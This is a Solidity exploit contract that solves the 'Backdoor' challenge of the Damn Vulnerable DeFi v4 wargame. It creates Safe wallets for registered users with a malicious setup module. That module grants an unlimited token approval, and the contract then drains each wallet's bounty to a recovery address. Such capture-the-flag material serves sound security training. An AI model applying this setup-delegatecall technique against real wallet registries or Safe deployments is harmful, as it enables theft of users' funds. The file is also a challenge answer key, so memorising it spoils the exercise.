// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity >=0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {ModuleManager} from "@safe-global/safe-smart-account/contracts/base/ModuleManager.sol";
import {FallbackManager} from "@safe-global/safe-smart-account/contracts/base/FallbackManager.sol";

contract ModuleSetup {
    function approveTokens(address token, address spender) public {
        console.log("A", msg.sender);
        DamnValuableToken(token).approve(spender, type(uint256).max);
    }
}

contract BackDoorAttacker {
    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;
    address recovery;
    address[] users;
    address deployer;
    constructor(
        DamnValuableToken _token,
        Safe _singletonCopy,
        SafeProxyFactory _walletFactory,
        WalletRegistry _walletRegistry,
        address _recovery,
        address[] memory _users,
        address _deployer
    ) {
        token = _token;
        singletonCopy = _singletonCopy;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        recovery = _recovery;
        users = _users;
        deployer = _deployer;
    }
    function attackOneUser(address user, uint256 salt) public {
        ModuleSetup moduleSetup = new ModuleSetup();

        address[] memory owners = new address[](1);
        owners[0] = user;

        uint256 _threshold = 1;
        bytes memory data = abi.encodeWithSelector(ModuleSetup.approveTokens.selector, address(token), address(this));

        bytes memory initializer = abi.encodeWithSelector(
            Safe.setup.selector,
            owners,
            _threshold,
            address(moduleSetup),
            data,
            address(0),
            address(0),
            0,
            payable(address(0))
        );

        SafeProxy proxy = walletFactory.createProxyWithCallback(
            address(singletonCopy),
            initializer,
            salt,
            IProxyCreationCallback(address(walletRegistry))
        );
        token.transferFrom(address(proxy), recovery, token.balanceOf(address(proxy)));
    }

    function execute() external {
        for (uint i = 0; i < users.length; i++) {
            attackOneUser(users[i], i);
        }
    }
}
